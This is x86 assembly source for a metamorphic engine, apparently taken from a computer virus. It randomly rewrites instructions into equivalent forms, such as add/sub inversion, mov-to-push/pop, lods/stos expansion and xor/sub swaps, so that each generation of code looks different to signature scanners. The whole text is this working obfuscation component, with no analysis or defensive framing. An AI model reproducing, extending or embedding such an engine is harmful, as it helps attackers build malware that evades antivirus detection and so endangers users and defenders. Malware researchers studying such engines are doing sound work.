add_entry PROC
       push esi
       push -2
       pop esi          ;this instruction have no equivalent in inbuffer
       call link_eip
       pop esi
       ret
add_entry ENDP

get_next PROC
       mov ebx,[esp+8*4+4+4]      ;genotype list
       movsx ebx,wo [ebx]
       add ebx,[esp.Pushad_ebx+4] ;ebx==ptr2next instruction
       ret
get_next ENDP

skip_next PROC
       push ebx
       mov ebx, [esp+8*4+4+4+4]
       add dwo [esp+8*4+4+4+4],2
       movsx ebx,wo [ebx]
       add [esp.Pushad_ebx+4+4],ebx
       pop ebx
       ret
skip_next ENDP

metamorph PROC
       pushad

       mov edx, [esi]           ;get instruction

;add/sub inversion (byte/word/dword)
       coin
       jnc @@no_addsub

       mov eax, edx
       sub ebx,ebx
       cmp al,66h               ;WORD prefix
       jne @@no_addsub_word
       shr eax,8
       inc ebx
  @@no_addsub_word:
       cmp al, 2dh
       je @@addsub_invert      ;is a EAX optimized SUB?
       cmp al, 2ch
       je @@addsub_invert_byte ;is a AL optimized SUB?
       cmp al, 05h
       je @@addsub_invert      ;is a EAX optimized ADD?
       cmp al, 04h
       je @@addsub_invert_byte ;is a AL optimized ADD?
       and ah, 011111000b
       cmp ah, 0e8h
       je @@subadd             ;a normal SUB?
       cmp ah, 0c0h
       jne @@no_addsub         ;a normal ADD?
  @@subadd:
       cmp al, 80h
       je @@addsub_byte        ;byte?
       cmp al, 81h
       jne @@no_addsub         ;dword/word?
  @@addsub_dword:
       cmp bl,1
       jne @@no_word_op1
       movsb                    ;copy word prefix
  @@no_word_op1:
       movsw
       xor by [edi-1], 0c0h xor 0e8h    ;invert sub<->add
       jmp @@negate
  @@addsub_invert:
       cmp bl,1
       jne @@no_word_op
       movsb                    ;copy word prefix
  @@no_word_op:
       lodsb
       xor al, 2dh xor 05h      ;invert optimized sub<->add (word/dword)
       stosb
  @@negate:
       cmp bl,1
       jne @@no_word_op2
       lodsw
       neg eax                  ;invert value (word)
       jmp @@sw_exit
  @@no_word_op2:
       lodsd
       neg eax                  ;invert value (dword)
  @@sd_exit:
       stosd
       jmp @@insert_nocode
  @@addsub_invert_byte:
       lodsw
       xor al,2ch xor 04h       ;invert optimized sub<->add (byte)
       neg ah                   ;invert value (byte)
  @@sw_exit:
       stosw
       jmp @@insert_nocode
  @@addsub_byte:
       movsw
       xor by [edi-1], 0c0h xor 0e8h    ;invert sub<->add
       lodsb
       neg al                   ;invert value (dword)
  @@sb_exit:
       stosb
       jmp @@insert_nocode
  @@no_addsub:


;mov dword reg,dword imm->push (byte/dword) imm/pop dword reg
       coin
       jnc @@no_mov_imm

       mov eax, edx
       mov ah, al
       and ax, 0000011111111000b        ;al=instruction/ah=register
       cmp al, 0b8h
       jne @@no_mov_imm                 ;if isnt a MOV REG, IMM exit...
       mov cl,ah
       lodsb
       mov al, 068h
       stosb
       lodsd                            ;build PUSH IMM
       call is_signed
       jnz @@big_push
       stosb                            ;used signed version
       mov by [edi-2],6ah
       jmp @@small_push
  @@big_push:
       stosd
  @@small_push:
       call add_entry
       mov al, 058h
       or al, cl                        ;build POP REG
       jmp @@sb_exit
  @@no_mov_imm:


;push (byte/dword) imm/pop dword reg->mov dword reg,dword imm
       coin
       jnc @@no_pop

       cmp dl, 06ah
       je @@is_push_s
       cmp dl, 068h
       jne @@no_pop                ;no PUSH forms?
       mov ecx,[esi+1]
       jmp @@_sk
  @@is_push_s:
       movsx ecx,by [esi+1]
  @@_sk:
       call get_next
       mov al,[ebx]
       mov ah,al
       and eax, 01111100000000111b
       sub ah,058h              ;next instruction is a POP?
       jnz @@no_pop
       or al, 0b8h
       stosb                    ;build MOV
       mov eax,ecx
       call skip_next           ;skip next entry(the POP)
       jmp @@sd_exit            ;save immediate & exit
  @@no_pop:


;push dword reg-pop dword reg->mov dword reg,dword reg
       coin
       jnc @@no_pushpop

       mov eax,edx
       mov ah,al
       and eax,00000011111111000b
       sub al,50h
       jne @@no_pushpop                ;no PUSH
       call get_next
       mov cl,[ebx]
       mov ch,cl
       and ecx, 01111100000000111b
       sub ch,058h              ;next instruction is a POP?
       jnz @@no_pushpop
       mov al,8bh
       coin
       jc @@swap_bit
       xchg ah,cl
       and al,not 010b  ;clear swap bit
  @@swap_bit:
       shl cl,3
       or ah,cl
       or ah,0c0h
       call skip_next           ;skip next entry(the POP)
       jmp @@sw_exit
  @@no_pushpop:


       mov al,dh                ;CL & CH will get used regs in instruction
       mov ch,dh
       mov cl,dh
       and ecx, 0000011100111000b               ;cl=source
       shr cl, 3                                ;ch=destine
       and al, 011000000b
       sub al, 011000000b
       jne @@no_modrm_rr


;mov reg,reg->push reg-pop reg (dword)
       coin
       jnc @@no_mov_regreg

       sub ebx,ebx
       cmp dl,89h
       je @@mov_regreg                  ;MOV REG,REG normal
       cmp dl,8bh
       jne @@no_mov_regreg              ;MOV REG,REG with swapbit set
       xchg cl,ch
  @@mov_regreg:
       lea eax,[ecx+5850h]              ;turn to ax->POP/PUSH
       stosb                            ;PUSH
       call add_entry
       xchg al,ah
       jmp @@sb_exit                    ;POP
  @@no_mov_regreg:


       cmp cl,ch                        ;are the same registers?
       jne @@no_same_rr


;sub reg,reg<->xor reg,reg (dword)
       coin
       jnc @@no_subxor

       mov eax,edx
       and al, not 010b         ;clear swapbit
       cmp al, 29h
       je @@subxor
       cmp al, 31h
       jne @@no_subxor
  @@subxor:
       xor al, 29h xor 31h
  @@set_swapbit:
       coin
       jc @@subxor_no_swapbit
       or al, 010b                      ;set swapbit
  @@subxor_no_swapbit:
       jmp @@sw_exit
  @@no_subxor:


;test reg,reg<->or reg,reg (dword/byte)
       coin
       jnc @@no_or_test

       mov eax,edx
       and ax, 0c0feh
       sub ah, 0c0h
       jnz @@no_or_test
       cmp al, 8
       je @@or_test
       cmp al,84h
       jnz @@no_or_test
  @@or_test:
       mov eax,edx
       xor al, 8h xor 84h
       jmp @@sw_exit
  @@no_or_test:

  @@no_same_rr:

  @@no_modrm_rr:


;lods -> mov ?a?,[esi]-add esi,? (byte/word/dword)
       coin
       jnc @@no_lodsd

       mov ecx,0ac06h               ;cl==register (ESI=6) ch=opcode
       mov ebp,8b66h

  @@check:
       mov ebx,1                ;ebx is the size
       mov eax,edx
       cmp al, 66h
       jne @@no_66
       add ebx, 1               ;is word prefix, so ebx=2
       shr eax,8
  @@no_66:
       sub al, ch
       jz @@lods                ;is the BYTE form of the opcode?
       dec al
       jnz @@no_lodsd           ;exit if no the WORD/DWORD too...
       cmp ebx,1
       jnz @@lods               ;is was a prefix, the size is already correct!
       add ebx,3           ;dword
  @@lods:
       mov eax, ebp                     ;ebx==size to add to ESI
       cmp ebx, 2
       jne @@i66                ;is word? store prefix
       stosb
  @@i66:
       shr eax,8
       cmp ebx,1
       jne @@no_b
       dec al                   ;if size is 1, then turn opcode2byte
  @@no_b:
       stosb            ;mov eax,
       mov al,cl
       stosb            ;[reg]

       call add_entry

       mov ax,0c081h            ;make add
       or ah,cl            ;reg
       stosw
       mov eax,ebx            ;imm
       jmp @@sd_exit            ;save immediate & exit

  @@no_lodsd:


;stos -> mov [edi],?a?-add edi,? (byte/word/dword)
       coin
       jnc @@no_stosd

       sub ecx,0aa07h         ;already called??
       jz @@no_stosd
       mov ecx,0aa07h                ;cl==register (EDI=7)
       mov ebp,8966h                ;ch=opcode
       jmp @@check

  @@no_stosd:


;mov ?a?,[esi]-add esi,? -> lods (byte/word/dword)
       coin
       jnc @@no_lods_stosd_sim

       call get_next
       mov ax, wo [ebx]
       mov ch,ah
       and eax, 0c0ffh
       sub eax, 0c081h          ;is 2nd instruction is a ADD REG, VALUE?
       jne @@no_lods_stosd_sim
       mov ebx,[ebx+2]
       cmp ebx,4                ;and VALUE <= 4?
       ja @@no_lods_stosd_sim

       mov cl, 4                ;cl==size
       mov eax,edx
       cmp al, 66h
       jne @@no_66_curse
       shr eax,8
       mov cl,2                 ;is word prefix
  @@no_66_curse:
       btr eax,0
       jc @@no_b_opcode
       mov cl,1         ;is byte
  @@no_b_opcode:

       xor cl,bl                ;size match with previously computed from the
       jnz @@no_lods_stosd_sim  ;ADD REG,IMM ?

       and ch, 00111111b

       cmp ax,0788h
       je @@is_sto
       cmp ax,068ah
       jne @@no_lods_stosd_sim
       inc ecx                  ;cl=1 if LODS
  @@is_sto:

       xor ch,ah                ;register in the MOV is same than in ADD ?
       jnz @@no_lods_stosd_sim

       cmp ebx, 2
       jne @@no_66_CRAP
       mov al, 66h
       stosb
  @@no_66_CRAP:
       mov al, 0abh
       test cl,cl
       jz @@damn_stos
       add al, 2                ;0adh
  @@damn_stos:
       cmp ebx,1
       jne @@is_damn_dword
       dec eax
  @@is_damn_dword:
       call skip_next
       jmp @@sb_exit

  @@no_lods_stosd_sim:


;cmd reg, byte imm<->cmd reg, dword imm
       coin
       jnc @@no_by_dwo

       mov eax,edx

       cmp ax, 0f481h           ;the XOR ESP should not be changed
       je @@no_by_dwo

       and eax, 0c0ffh

       cmp eax, 0c081h
       je @@reduce
       sub eax, 0c083h
       jnz @@no_by_dwo

  @@increase:
       movsx eax,by [esi+2]
       movsw
       sub esi, 2
       mov by [edi-2],81h
       jmp @@sd_exit

  @@reduce:
       mov eax,[esi+2]
       call is_signed
       jnz @@no_by_dwo
       movsw
       sub esi, 2
       mov by [edi-2],83h
       jmp @@sb_exit

  @@no_by_dwo:


;dec/inc <-> sub reg,1 (dword)
       coin
       jnc @@isnt_dec_inc

       mov ebx,edx
       and ebx, 00fff8ffh
       mov cl,dh
       and cl, 0111b

       mov eax,01c083h          ;add reg,1
       cmp ebx,eax
       je @@is_add1
       sub ebx,01e883h          ;sub reg,1
       je @@is_sub1

       mov ecx,edx
       mov ch,cl
       and ecx, 011111111000b

       cmp cl, 40h
       je @@inc
       cmp cl, 48h
       jne @@isnt_dec_inc
       mov ah, 0e8h             ;sub reg,1
  @@inc:
       or ah,ch
       stosd
       dec edi
       jmp @@insert_nocode

  @@is_add1:
       mov al, 40h              ;inc reg
       jmp @@do_or_jmp
  @@is_sub1:
       mov al, 48h              ;dec reg
  @@do_or_jmp:
       or al,cl
       jmp @@sb_exit

  @@isnt_dec_inc:

  @@no_metamorph:
       clc
  @@ret:
       popad
       ret

  @@insert_nocode:
       mov [esp.Pushad_edi],edi
       mov [esp.Pushad_esi],esi
       stc
       jmp @@ret
metamorph ENDP
